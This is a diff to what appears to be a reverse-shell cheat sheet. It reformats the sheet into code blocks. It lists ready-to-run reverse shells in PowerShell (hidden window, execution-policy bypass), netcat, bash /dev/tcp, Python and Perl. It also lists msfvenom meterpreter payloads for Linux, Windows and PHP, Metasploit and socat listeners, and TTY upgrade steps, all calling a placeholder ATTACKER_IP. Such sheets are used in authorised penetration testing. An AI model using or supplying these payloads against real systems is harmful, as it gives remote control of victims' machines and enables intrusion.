@@ -69,6 +69,7 @@ p.waitFor();
 
 ### PowerShell
 
+``
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Objec
 t System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetSt
 ream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
@@ -77,83 +78,105 @@ oding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$
 sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.enco
 ding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Len
 gth);$stream.Flush()};$client.Close()"
+``
 
 ### Netcat (if installed)
 
+``
 nc -e cmd.exe ATTACKER_IP PORT
+``
 
 ### MSFvenom Windows Payload
 
+``
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f
 exe > shell.exe
+``
      ____________________________________________________________
 
 ## 🖥️ MacOS Reverse Shells
 
 ### Bash
 
+``
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+``
 
 ### Python
 
+``
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,soc
 ket.SOCK_STREAM); s.connect(("ATTACKER_IP",PORT)); os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh"
 ,"-i"]);'
+``
 
 ### Perl
 
+``
 perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,
 getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(S
 TDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-     ____________________________________________________________
+``
 
 ## 🖥️ Meterpreter Reverse Shell (Metasploit)
 
 ### Linux
 
+``
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT
  -f elf > shell.elf
+``
 
 ### Windows
 
+``
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PO
 RT -f exe > shell.exe
+``
 
 ### PHP
 
+``
 msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f ra
 w > shell.php
+``
 
 #### Start Metasploit Listener
 
+``
 msfconsole -q
 use exploit/multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
 set LHOST ATTACKER_IP
 set LPORT PORT
 exploit
-     ____________________________________________________________
+``
 
 ## 🛠️ Setting Up a Listener
 
 ### Netcat
 
+``
 nc -lvnp PORT
+``
 
 ### Socat
 
+``
 socat -d -d TCP-LISTEN:PORT STDOUT
+``
 
 ### Metasploit
 
+``
 msfconsole -q
 use exploit/multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
 set LHOST ATTACKER_IP
 set LPORT PORT
 exploit
-     ____________________________________________________________
+``
 
    #Gawk Reverse Shell #!/usr/bin/gawk -f
 
@@ -178,16 +201,21 @@ exploit
 
 ## In reverse shell
 
+``
    $ python -c 'import pty; pty.spawn("/bin/bash")' Ctrl-Z
+``
 
 ## In Attacker console
 
+``
    $ stty raw -echo $ fg
-
+``
 ## In reverse shell
 
+``
    $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty
    rows columns
+``
 
 ### About
 
